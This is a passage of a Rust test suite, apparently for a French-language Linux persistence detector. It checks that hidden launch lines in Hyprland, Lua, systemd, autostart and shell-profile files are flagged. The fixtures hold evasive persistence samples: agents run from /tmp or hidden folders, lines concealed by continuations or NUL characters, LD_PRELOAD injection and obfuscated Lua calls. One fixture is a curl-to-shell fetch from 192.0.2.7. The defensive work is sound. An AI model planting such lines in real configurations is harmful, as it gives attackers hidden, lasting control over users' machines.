            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
        }
        // Sans rien de caché, rien n'est levé.
        let m = Maison::nouvelle("variable-hypr-sain");
        m.ecrire(
            ".config/hypr/hyprland.conf",
            "$terminal = /usr/bin/kitty\nexec-once = $terminal\nexec-once = $HOME/bin/outil\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
        let variables = std::collections::BTreeMap::from([
            ("a".to_string(), vec!["$a/x".to_string()]),
            ("t".to_string(), vec!["/usr/bin/kitty".to_string()]),
            ("term".to_string(), vec!["/tmp/k".to_string()]),
        ]);
        assert_eq!(resoudre_hypr("$a", &variables), None, "boucle");
        assert_eq!(resoudre_hypr("$termx", &variables), Some(vec!["/tmp/kx".to_string()]));
    }

    /// Lot de détection de la persistance, point 1 : une ligne Exec coupée par « \ » se juge jointe comme systemd la
    /// joint (une unité, un .desktop), de même qu'une ligne cachée derrière une fin de ligne que seul systemd voit
    /// (« \r », « \0 »). Levée, jamais déclarable, avec sa raison et son fichier:ligne.
    #[test]
    fn exec_continuee_de_systemd() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".config/systemd/user/rappel.service",
                "[Service]\nExecStart=/usr/bin/env \\\n  /tmp/.x/agent\n",
                "~/.config/systemd/user/rappel.service:2",
            ),
            (
                ".config/systemd/user/rappel.service",
                "[Service]\n# rien\nExecStart=/usr/bin/bash \\\n# commentaire sauté\n    ~/.y/a.sh\n",
                "~/.config/systemd/user/rappel.service:3",
            ),
            (
                ".config/systemd/user/rappel.service",
                "[Service]\nExecStart=/usr/bin/true\rExecStartPost=/tmp/.x/agent\n",
                "~/.config/systemd/user/rappel.service:2",
            ),
            (
                ".config/systemd/user/rappel.service",
                "[Service]\nExecStart=/usr/bin/true\0ExecStartPost=/tmp/.x/agent\n",
                "~/.config/systemd/user/rappel.service:2",
            ),
            (
                ".config/autostart/rappel.desktop",
                "[Desktop Entry]\nType=Application\nExec=/usr/bin/env \\\n/tmp/.x/agent\n",
                "~/.config/autostart/rappel.desktop:3",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("exec-continuee-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(
                c.message.contains("dossier temporaire") || c.message.contains("dossier caché"),
                "{}",
                c.message
            );
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
            if fichier.ends_with(".service") {
                let r = refus(&c);
                assert!(r.contains(attendu) && r.contains("une seule ligne"), "{texte:?} : {r}");
            }
        }
        // « \\ » en fin de ligne et « \ » suivi d'un blanc ne continuent pas : la ligne suivante se juge seule.
        let m = Maison::nouvelle("exec-continuee-non");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nExecStart=/usr/bin/true \\\\\nExecStart=/usr/bin/true \\ \nExecStartPost=/usr/bin/true\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Point 1 : les lignes telles que systemd 262 les lit (`read_line`, `config_parse`).
    #[test]
    fn lignes_lues_comme_systemd() {
        let lues = |t: &str| -> Vec<(usize, usize, String)> {
            lignes_de_systemd(t)
                .into_iter()
                .map(|l| (l.numero, l.lues, l.texte))
                .collect()
        };
        let l = |n: usize, lues: usize, t: &str| (n, lues, t.to_string());
        assert_eq!(
            lues("a\r\nb\n\rc\0\nd"),
            [l(1, 1, "a"), l(2, 1, "b"), l(3, 1, "c"), l(4, 1, "d")]
        );
        assert_eq!(lues("a \\\n  b\\\n#x\n;y\nc"), [l(1, 3, "a    b c")]);
        assert_eq!(lues("a\\\n\nb"), [l(1, 2, "a"), l(3, 1, "b")]);
        assert_eq!(lues("a\\\\\nb\\ \nc"), [l(1, 1, "a\\\\"), l(2, 1, "b\\"), l(3, 1, "c")]);
        // systemd ôte le BOM en tête de chaque ligne, pas seulement du fichier (relecture adverse, C1).
        assert_eq!(lues("\u{FEFF}x=1\n\u{FEFF}y"), [l(1, 1, "x=1"), l(2, 1, "y")]);
        assert_eq!(lues("a\\"), [l(1, 1, "a")]);
        assert_eq!(lues("\n\n\t# z\n  e  \n"), [l(4, 1, "e")]);
    }

    /// Point 2 : un raccourci de Hyprland (« bind… = …, exec, … », toutes ses formes) et un lancement précédé de
    /// règles se jugent comme « exec-once », variables comprises ; levés, jamais déclarables.
    #[test]
    fn raccourci_de_hypr_juge() {
        for (i, (texte, attendu)) in [
            ("bind = SUPER, Q, exec, /tmp/.x/agent\n", "dossier temporaire"),
            ("bindd = SUPER, Q, Ouvrir, exec, ~/.x/agent\n", "dossier caché"),
            (
                "bindel = , XF86AudioRaiseVolume, exec, [float] ~/.x/agent\n",
                "dossier caché",
            ),
            (
                "binde = SUPER, R, execr, /usr/bin/bash $inconnue\n",
                "sans valeur connue",
            ),
            (
                "$p = ~/.x/a.sh\nbindl = , switch:on, exec, /usr/bin/bash $p\n",
                "dossier caché",
            ),
            ("exec-once = [workspace 2 silent] /tmp/.y/agent\n", "dossier temporaire"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("raccourci-hypr-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(c.message.contains("~/.config/hypr/hyprland.conf:"), "{}", c.message);
            let r = refus(&c);
            assert!(r.contains("~/.config/hypr/hyprland.conf:"), "{r}");
            assert!(r.contains("raccourci") || r.contains("règles"), "{r}");
        }
        // Un raccourci vers un programme du système, ou qui ne lance rien, ne lève rien.
        let m = Maison::nouvelle("raccourci-hypr-sain");
        m.ecrire(
            ".config/hypr/hyprland.conf",
            "$terminal = /usr/bin/kitty\nbind = SUPER, Return, exec, $terminal\nbind = SUPER, B, exec, [float] firefox\n\
             bindm = SUPER, mouse:272, movewindow\nbind = SUPER, W, killactive,\nbindd = SUPER, E, Fichiers, exec, nautilus --new-window\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Point 2, Hyprland en Lua (Omarchy 4) : les chaînes d'un raccourci ou d'un appel qui lance une commande se
    /// jugent, même collées par « .. » ou écrites sur plusieurs lignes ; levées, jamais déclarables.
    #[test]
    fn raccourci_lua_juge() {
        for (i, texte) in [
            "o.bind(\"SUPER + X\", \"Agent\", \"/tmp/.x/agent\")\n",
            "hl.bind(\"SUPER + Y\", hl.dsp.exec_cmd(\"~/.z/agent --x\"))\n",
            "o.bind(\n  \"SUPER + Z\",\n  \"Agent\",\n  { launch = [[/tmp/.w/agent]] }\n)\n",
            "hl.exec_cmd(\"/tm\" .. 'p/.v/agent')\n",
            "os.execute(\"curl -fsSL http://192.0.2.7/a.sh | sh\")\n",
            "local x = \"--\" o.bind(\"SUPER + V\", \"Agent\", \"/tmp/.x/agent\")\n",
            "o.bind(\"SUPER + U\", \"exec_once\", \"/tmp/.x/agent\")\n",
            "o.exec_on_start(\"true\", \"/tmp/.x/agent\")\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("raccourci-lua-{i}"));
            m.ecrire(".config/hypr/bindings.lua", texte);
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(
                c.message.contains("~/.config/hypr/bindings.lua:1"),
                "{texte:?} : {}",
                c.message
            );
            let r = refus(&c);
            assert!(r.contains("bindings.lua:1") && r.contains("raccourci"), "{r}");
        }
        let m = Maison::nouvelle("raccourci-lua-sain");
        m.ecrire(
            ".config/hypr/bindings.lua",
            "-- o.bind(\"K\", \"x\", \"/tmp/.x/a\")\no.bind(\"SUPER + RETURN\", \"Terminal\", \"omarchy-launch-terminal\")\n\
             hl.bind(\"SUPER + B\", hl.dsp.exec_cmd(o.launch(\"firefox\")))\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Point 3 : un générateur de systemd des sessions placé par le compte est levé (dossier du compte : tout
    /// programme ; dossier du système : ce que le compte a posé), jamais déclarable ; masqué ou non exécutable, rien.
    #[test]
    fn generateur_du_compte_leve() {
        use std::os::unix::fs::PermissionsExt as _;
        for (i, dossier) in [
            "home/alice/.config/systemd/user-generators",
            "home/alice/.config/systemd/user-environment-generators",
            "etc/systemd/user-generators",
            "usr/local/lib/systemd/user-environment-generators",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("generateur-{i}"));
            let lu = m.racine.join(dossier);
            std::fs::create_dir_all(&lu).unwrap();
            let programme = lu.join("agent");
            std::fs::write(&programme, "#!/bin/sh\necho x\n").unwrap();
            std::fs::set_permissions(&programme, std::fs::Permissions::from_mode(0o755)).unwrap();
            std::fs::write(lu.join("note"), "pas un programme\n").unwrap();
            std::os::unix::fs::symlink("/dev/null", lu.join("masque")).unwrap();
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{dossier} : {}", c.message);
            assert!(c.message.contains("générateur"), "{}", c.message);
            assert!(c.message.contains("/agent"), "{}", c.message);
            assert!(
                !c.message.contains("note") && !c.message.contains("masque"),
                "{}",
                c.message
            );
            let r = refus(&c);
            assert!(
                r.contains("un générateur de systemd ne peut pas être déclaré normal"),
                "{r}"
            );
            assert!(r.contains("/agent"), "{r}");
        }
    }

    /// Point 3, la règle des dossiers du système : à root sans écriture pour le groupe ni les autres, rien ; sinon
    /// levé. Dans un espace de noms d'utilisateurs, seule l'identité du processus compte.
    #[test]
    fn generateur_du_systeme_pose_par_le_compte() {
        assert!(!pose_par_le_compte(&[(0, 0o100_755), (0, 0o40_755)], 1000, true));
        assert!(pose_par_le_compte(&[(1000, 0o100_755), (0, 0o40_755)], 1000, true));
        assert!(pose_par_le_compte(&[(0, 0o100_755), (0, 0o40_777)], 1000, true));
        assert!(pose_par_le_compte(&[(0, 0o100_775), (0, 0o40_755)], 1000, true));
        assert!(
            !pose_par_le_compte(&[(0, 0o100_755)], 0, true),
            "lancé par root : un fichier de root, rien"
        );
        assert!(!pose_par_le_compte(&[(65534, 0o100_755)], 0, false), "root vu ailleurs");
        assert!(pose_par_le_compte(&[(0, 0o100_755)], 0, false), "le compte vu root");
    }

    /// Point 4 : les unités du dossier de la session (XDG_RUNTIME_DIR/systemd) se lisent comme celles du compte,
    /// transient/ (systemd-run) jugée par son contenu ; levées, jamais déclarables.
    #[test]
    fn unite_de_la_session_lue() {
        for (i, (dossier, texte)) in [
            ("systemd/user", "[Service]\nExecStart=/tmp/.x/agent\n"),
            ("systemd/transient", "[Service]\nExecStart=\"/tmp/.x/agent\"\n"),
            ("systemd/generator.late", "[Service]\nExecStart=:%h/.x/agent\n"),
            (
                "systemd/user.control",
                "[Service]\nExecStart=/usr/bin/env \\\n /tmp/.x/agent\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("session-{i}"));
            let f = m.racine.join("run/user/1000").join(dossier).join("agent.service");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, texte).unwrap();
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{dossier} : {}", c.message);
            assert!(
                c.message.contains(&format!("/run/user/1000/{dossier}/agent.service:2")),
                "{}",
                c.message
            );
            let r = refus(&c);
            assert!(r.contains("dossier de la session"), "{r}");
        }
        // Une unité de systemd-run qui lance un programme du système ne lève rien.
        let m = Maison::nouvelle("session-sain");
        let f = m.racine.join("run/user/1000/systemd/transient/run-r1.service");
        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
        std::fs::write(
            &f,
            "# This is a transient unit file\n[Service]\nExecStart=\"/usr/bin/sleep\" \"60\"\n",
        )
        .unwrap();
        assert_eq!(m.lancements().probleme, None);
    }

    /// Deuxième vérification de la campagne E : le détail des variables se lit en quelques lignes (une par sorte de
    /// chose liée), et les lignes qui posent une variable hors de la liste sûre se montrent en clair.
    #[test]
    fn detail_des_variables_lisible() {
        let m = maison_avec_rappel("detail-variables");
        m.ecrire(
            ".profile",
            "export LANG=fr_CA.UTF-8\nexport PATH=\"$HOME/bin:$PATH\"\n. ./voisin.sh\n",
        );
        m.ecrire(".config/environment.d/10-a.conf", "EDITOR=nvim\n");
        let c = m.lancements();
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
        let apercu = apercu_de_l_environnement(&c);
        assert!(apercu.len() <= 6, "{apercu:?}");
        assert!(
            apercu[0].starts_with("2 fichiers de variables liés en entier"),
            "{apercu:?}"
        );
        assert!(
            apercu
                .iter()
                .any(|l| l.contains("non suivis") && l.contains("~/.profile:3")),
            "{apercu:?}"
        );
        assert!(
            apercu.iter().any(|l| l.contains("~/.profile:2") && l.contains("PATH")),
            "{apercu:?}"
        );
        assert!(
            apercu.iter().any(|l| l.contains("10-a.conf:1") && l.contains("EDITOR")),
            "{apercu:?}"
        );
        assert!(!apercu.iter().any(|l| l.contains("LANG")), "{apercu:?}");
    }

    /// Deuxième vérification de la campagne E, 2.4 et 2.5 : un « source = » de Hyprland se suit à tous les niveaux,
    /// même hors de ~/.config/hypr, et par un joker ; un profil lit aussi par « [ -f x ] && . x » et « if … fi ».
    #[test]
    fn sources_suivies_a_tous_les_niveaux() {
        let m = maison_avec_rappel("hypr-niveaux");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/a.conf\n");
        m.ecrire(".autres/a.conf", "source = ~/.loin/b.conf\n");
        m.ecrire(".loin/b.conf", "# rien\n");
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        m.ecrire(".loin/b.conf", "env = EDITOR,nvim\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
        m.ecrire(".loin/b.conf", "env = LD_PRELOAD,/tmp/l.so\n");
        assert!(refus(&m.lancements()).contains("~/.loin/b.conf:1"));

        let m = maison_avec_rappel("hypr-joker");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/*.conf\n");
        m.ecrire(".autres/v.conf", "# rien\n");
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        m.ecrire(".autres/v.conf", "# autre chose\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));

        for (i, (fichier, texte)) in [
            (".bashrc", "[ -f ~/.autres/p.sh ] && . ~/.autres/p.sh\n"),
            (
                ".profile",
                "if [ -r \"$HOME/.autres/p.sh\" ]; then\n  . \"$HOME/.autres/p.sh\"\nfi\n",
            ),
            (
                ".zshrc",
                "[[ -f ${HOME}/.autres/p.sh ]] && source ${HOME}/.autres/p.sh\n",
            ),
            (".bashrc", "if [ -f ~/.autres/p.sh ]; then . ~/.autres/p.sh; fi\n"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("shell-formes-{i}"));
            m.ecrire(fichier, texte);
            m.ecrire(".autres/p.sh", "# rien\n");
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok(), "{texte}");
            m.ecrire(".autres/p.sh", "export EDITOR=vi\n");
            assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
        }
    }

    /// Deuxième vérification de la campagne E : ZDOTDIR, ~/.xsessionrc et ~/.bash_logout se lisent aussi.
    #[test]
    fn autres_profils_lus() {
        for (i, fichier) in [".xsessionrc", ".bash_logout", ".zlogout"].into_iter().enumerate() {
            let m = maison_avec_rappel(&format!("autres-profils-{i}"));
            m.ecrire(fichier, "export LD_PRELOAD=/tmp/l.so\n");
            assert!(refus(&m.lancements()).contains(fichier), "{fichier}");
        }
        let m = maison_avec_rappel("zdotdir");
        let zdot = m.chemin(".config/zsh");
        m.ecrire(".config/zsh/.zshenv", "export BASH_ENV=/tmp/x\n");
        let c = persistance_dans(
            &m.racine,
            &m.racine.join("home/alice"),
            |v| match v {
                "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
                "ZDOTDIR" => Some(zdot.clone().into_os_string()),
                _ => None,
            },
            None,
            None,
        )
        .into_iter()
        .next()
        .unwrap();
        assert!(refus(&c).contains(".config/zsh/.zshenv:1"), "{}", refus(&c));
    }

    /// Deuxième vérification de la campagne E : un dossier personnel absent, ou un dossier de démarrages du compte
    /// illisible, est « non vérifié », jamais « rien de suspect ».
    #[cfg(unix)]
    #[test]
    fn dossiers_du_compte_illisibles_dits() {
        use std::os::unix::fs::PermissionsExt as _;
        let m = Maison::nouvelle("maison-absente");
        let c = persistance_dans(&m.racine, &m.racine.join("home/personne"), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(c.message.contains("dossier personnel ne se lit pas"), "{}", c.message);
        let m = maison_avec_rappel("config-illisible");
        let dossier = m.chemin(".config/autostart");
        std::fs::create_dir_all(&dossier).unwrap();
        std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o000)).unwrap();
        if std::fs::read_dir(&dossier).is_ok() {
            std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o755)).unwrap();
            return crate::essais::saute("le compte lit un dossier sans droit de lecture (root)");
        }
        let c = m.lancements();
        std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(c.message.contains("~/.config/autostart ne se lit pas"), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// Une ligne de cron se lit sans son horaire ni le compte qui la lance.
    #[test]
    fn commandes_de_cron() {
        assert_eq!(commande_de_cron("*/5 * * * * /opt/a --b", false), "/opt/a --b");
        assert_eq!(commande_de_cron("@reboot /opt/a", false), "/opt/a");
        assert_eq!(commande_de_cron("0 3 * * * root /opt/a", true), "/opt/a");
        assert_eq!(commande_de_cron("@daily root /opt/a", true), "/opt/a");
    }

    /// Levée (au moins « élevé ») ; déclarable ou non comme la même ligne écrite simplement.
    fn leve(c: &Constat, quoi: &str) {
        assert!(c.probleme >= Some(Niveau::Eleve), "{quoi:?} : {}", c.message);
    }

    // ---- Relecture adverse du lot (B1 à C11) : chaque forme levée, jamais déclarable. Valeurs inventées. ----

    impl Maison {
        /// La persistance lue avec ces variables d'environnement en plus (XDG_RUNTIME_DIR vaut /run/user/1000 si
        /// elles ne le donnent pas).
        fn lancements_avec(&self, variables: &[(&str, &str)]) -> Constat {
            persistance_dans(
                &self.racine,
                &self.racine.join("home/alice"),
                |v| {
                    variables
                        .iter()
                        .find(|(n, _)| *n == v)
                        .map(|(_, x)| (*x).into())
                        .or_else(|| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()))
                },
                None,
                None,
            )
            .into_iter()
            .next()
            .unwrap()
        }
    }

    /// Levée (au moins « élevé »), jamais déclarable ; rend le refus.
    fn leve_non_declarable(c: &Constat, quoi: &str) -> String {
        leve(c, quoi);
        assert!(crate::apprentissage::declarable(c).is_err(), "{quoi:?} : déclarable");
        refus(c)
    }

    /// B1, B2, B3, C6, C7, C8, C11 : Hyprland tel que hyprlang le lit (variables remplacées avant la coupe en
    /// champs, noms de variables longs, lignes jointes par « \ », catégories, fichiers inclus quelle que soit leur
    /// extension, clés qui chargent ou lancent). Ce qui ne se ramène pas à sa forme finale est dit.
    #[test]
    fn hyprland_lu_comme_hyprlang() {
        for (i, texte) in [
            // B1 : le mot « exec », ou toute la valeur, vient d'une variable ; variable inconnue dans un raccourci.
            "$e = exec\nbind = SUPER, Q, $e, ~/.x/agent\n",
            "$b = SUPER, Q, exec, ~/.x/agent\nbind = $b\n",
            "bind = SUPER, Q, $inconnue\n",
            // B2 : un nom qui commence par celui d'une variable connue.
            "$HOME-x = /tmp/.x\nexec-once = $HOME-x/agent\n",
            // B3 : chemin, mot-clé, « exec » coupés par une continuation.
            "exec-once = /tm\\\np/.x/agent\n",
            "exec-\\\nonce = /tmp/.x/agent\n",
            "bind = SUPER, Q, ex\\\nec, ~/.x/agent\n",
            "$p = /tm\\\np/.x\nexec-once = $p/agent\n",
            // C8 : greffon, geste, clés de hypridle.
            "plugin = ~/.x/greffon.so\n",
            "gesture = 3, up, dispatcher, exec, ~/.x/agent\n",
            "listener {\n  timeout = 300\n  on-timeout = ~/.x/agent\n}\n",
            "general {\n  lock_cmd = /tmp/.x/agent\n}\n",
            // C7 : source à variable, non suivie : dit.
            "$d = ~/.config/hypr\nsource = $d/autres.conf\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-hypr-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains("~/.config/hypr/hyprland.conf"),
                "{texte:?} : {}",
                c.message
            );
        }
        // C11 : dans une catégorie quelconque, ou finie par « \r\n », une ligne se lit comme écrite simplement
        // (déclarable comme elle : la ligne exacte se montre et se lie).
        for (i, texte) in [
            "x {\n  exec-once = /tmp/.x/agent\n}\n",
            "x { exec-once = /tmp/.x/agent }\n",
            "exec-once = /tmp/.x/agent\r\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-hypr-categorie-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            leve(&m.lancements(), texte);
        }
        // C6 : un fichier inclus sans « .conf » se juge comme une config de Hyprland (raccourci compris), et sa ligne
        // ne se déclare pas normale. C7 : « source » relatif au fichier qui l'inclut, suivi.
        for (i, (source, inclus, texte)) in [
            (
                "source = ~/.config/hypr/extra.inc\n",
                ".config/hypr/extra.inc",
                "bind = SUPER, Q, exec, ~/.x/agent\n",
            ),
            (
                "source = ~/.config/hypr/extra.inc\n",
                ".config/hypr/extra.inc",
                "exec-once = ~/.x/agent\n",
            ),
            (
                "source = ./sous/x.cfg\n",
                ".config/hypr/sous/x.cfg",
                "exec-once = /tmp/.x/agent\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-hypr-inclus-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", source);
            m.ecrire(inclus, texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(c.message.contains(&format!("~/{inclus}")), "{texte:?} : {}", c.message);
        }
        // C8, toute clé : un programme exécutable caché nommé par une clé quelconque est levé ; un simple chemin
        // caché qui n'est pas un programme (un fond d'écran, un thème) ne l'est pas.
        let m = Maison::nouvelle("relecture-hypr-cle");
        m.ecrire(".config/hypr/hyprland.conf", "misc {\n  autre = ~/.x/agent\n}\n");
        m.ecrire(".x/agent", "#!/bin/sh\n");
        assert_eq!(m.lancements().probleme, None, "pas exécutable : rien");
        {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::set_permissions(m.chemin(".x/agent"), std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        leve_non_declarable(&m.lancements(), "clé quelconque");
        // Ce qu'une config courante écrit ne lève rien.
        let m = Maison::nouvelle("relecture-hypr-sain");
        m.ecrire(
            ".config/hypr/hyprland.conf",
            "$terminal = kitty\n$mod = SUPER\nsource = ~/.config/hypr/monitors.conf\nsource = ./looknfeel.conf\n\
             bind = $mod, RETURN, exec, $terminal\nbind = $mod, B, exec, firefox \\\n--new-window\n\
             general {\n  gaps_in = 5\n}\nmisc {\n  background = ~/.config/omarchy/current/background\n}\n\
             exec-once = uwsm app -- hypridle\nenv = XCURSOR_SIZE,24\n",
        );
        m.ecrire(".config/hypr/monitors.conf", "monitor = , preferred, auto, 1\n");
        m.ecrire(".config/hypr/looknfeel.conf", "decoration {\n  rounding = 0\n}\n");
        m.ecrire(
            ".config/hypr/hypridle.conf",
            "general {\n  lock_cmd = omarchy-lock-screen\n  before_sleep_cmd = loginctl lock-session\n}\n\
             listener {\n  timeout = 300\n  on-timeout = loginctl lock-session\n}\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// B4, C9, C10 : Lua. Les formes d'appel que Lua accepte se lisent ; ce qui ne se ramène pas à une chaîne connue
    /// est dit (« commande non lue »), jamais tu.
    #[test]
    fn lua_lu_ou_dit() {
        let long = format!("hl.exec_cmd(\n{}\"/tmp/.x/agent\")\n", "  \"\" ..\n".repeat(20));
        for (i, texte) in [
            "hl.exec_cmd (\"/tmp/.x/agent\")\n",
            "hl.exec_cmd \"/tmp/.x/agent\"\n",
            "hl.exec_cmd [[/tmp/.x/agent]]\n",
            "hl.exec_cmd(\"\\47tmp\\47.x/agent\")\n",
            "hl.exec_cmd(\"\\x2ftmp/.x/agent\")\n",
            "hl.exec_cmd(\"/t\\z\n   mp/.x/agent\")\n",
            "local t = \"/tmp/.x/agent\"\nhl.bind(\"SUPER + Q\", hl.dsp.exec_cmd(t))\n",
            "local d = \"/tmp/.x\"\nhl.exec_cmd(d .. \"/agent\")\n",
            "local d = os.getenv(\"HOME\") .. \"/.x\"\nhl.exec_cmd(d .. \"/agent\")\n",
            "--[[ x ]] hl.exec_cmd(\"/tmp/.x/agent\")\n",
            "local e = os.execute\ne(\"/usr/bin/true\")\n",
            "o.launch = function(c) return c end\n",
            "local n = f()\nhl.bind(\"SUPER + Q\", n, {})\n",
            "function o.bind(t, d, c) end\n",
            "o.bind(\"SUPER + O\", \"Notes\", { launch = \"/tmp/.x/agent\" })\n",
            "o.bind(\"SUPER + O\", \"Notes\", { launch = os.execute })\n",
            "hl.dsp.exec_raw(\"/tmp/.x/agent\")\n",
            "hl.plugin.load(\"/tmp/.x/greffon.so\")\n",
            "package.path = \"/tmp/.x/?.lua;\" .. package.path\n",
            "load(\"return 1\")()\n",
            "hl.exec_cmd(f())\n",
            "hl.exec_cmd(table.concat({\"/tmp\", \"/.x/agent\"}))\n",
            "dofile(\"/tmp/.x/a.lua\")\n",
            "require(nom)\n",
            "os[\"execute\"](\"/tmp/.x/agent\")\n",
            "os[\"exe\" .. \"cute\"](\"/usr/bin/true\")\n",
            long.as_str(),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-lua-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains("~/.config/hypr/hyprland.lua"),
                "{texte:?} : {}",
                c.message
            );
        }
        // C10 : un module à plusieurs niveaux est lu.
        let m = Maison::nouvelle("relecture-lua-module");
        m.ecrire(".config/hypr/hyprland.lua", "require(\"a.b.c\")\n");
        m.ecrire(".config/hypr/a/b/c.lua", "hl.exec_cmd(\"/tmp/.x/agent\")\n");
        let c = m.lancements();
        leve_non_declarable(&c, "module");
        assert!(c.message.contains("~/.config/hypr/a/b/c.lua"), "{}", c.message);
        // Une config comme celle d'Omarchy (valeurs inventées) ne lève rien.
        let m = Maison::nouvelle("relecture-lua-sain");
        m.ecrire(
            ".config/hypr/hyprland.lua",
            "-- Réglages\ndofile((os.getenv(\"OMARCHY_PATH\") or \"/usr/share/omarchy\") .. \"/default/hypr/bootstrap.lua\")\n\
             require(\"monitors\")\nlocal mod = \"SUPER\"\n\
             hl.bind(mod .. \" + RETURN\", hl.dsp.exec_cmd(\"kitty\"))\n\
             hl.bind(mod .. \" + B\", hl.dsp.exec_cmd(\"firefox --new-window\"), { description = \"Navigateur\" })\n\
             for i = 1, 9 do\n  hl.bind(mod .. \" + \" .. i, hl.dsp.focus({ workspace = i }))\nend\n\
             hl.env(\"XCURSOR_SIZE\", \"24\")\nhl.config({ general = { gaps_in = 5 } })\n\
             o.bind(\"SUPER + SHIFT + O\", \"Notes\", { launch = \"obsidian\", focus = \"^obsidian$\" })\n\
             for n = 1, 5 do\n  o.bind(\"SUPER + \" .. n, \"Groupe \" .. n, hl.dsp.group.active({ index = n }))\nend\n",
        );
        m.ecrire(
            ".config/hypr/monitors.lua",
            "hl.monitor({ output = \"\", mode = \"preferred\" })\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Vérification 2, N9 : un nom que Lua peut lier à autre chose que ses valeurs écrites (paramètre, variable de
    /// boucle, « ... », global posé par « _G »), une variable d'environnement inconnue, un index calculé de « hl » ou
    /// une bibliothèque passée comme valeur, un commentaire fini par un retour chariot seul, les aides d'Omarchy qui
    /// lancent : levé, jamais résolu à tort.
    #[test]
    fn lua_portees_et_aides_d_omarchy() {
        for (i, texte) in [
            "local c = \"kitty\"\nlocal function run(c) hl.exec_cmd(c) end\nrun(\"/tmp/.x/agent\")\n",
            "local c = \"kitty\"\nlocal f = function(c) hl.exec_cmd(c) end\nf(\"/tmp/.x/agent\")\n",
            "local c = \"kitty\"\n(function(c) hl.exec_cmd(c) end)(\"/tmp/.x/agent\")\n",
            "local cmd = \"kitty\"\nfor _, cmd in ipairs{\"/tmp/.x/agent\"} do hl.exec_cmd(cmd) end\n",
            "local cmd = \"kitty\"\nfor cmd in pairs{[\"/tmp/.x/agent\"] = 1} do hl.exec_cmd(cmd) end\n",
            "local function run() hl.exec_cmd(c) end\nlocal c = \"kitty\"\n_G.c = \"/tmp/.x/agent\"\nrun()\n",
            "local c = \"kitty\"\nrawset(_G, \"c\", \"/tmp/.x/agent\")\n",
            "local function run(...) hl.exec_cmd(...) end\nrun(\"/tmp/.x/agent\")\n",
            "hl.exec_cmd(os.getenv(\"ZZ\") .. \"/agent\")\n",
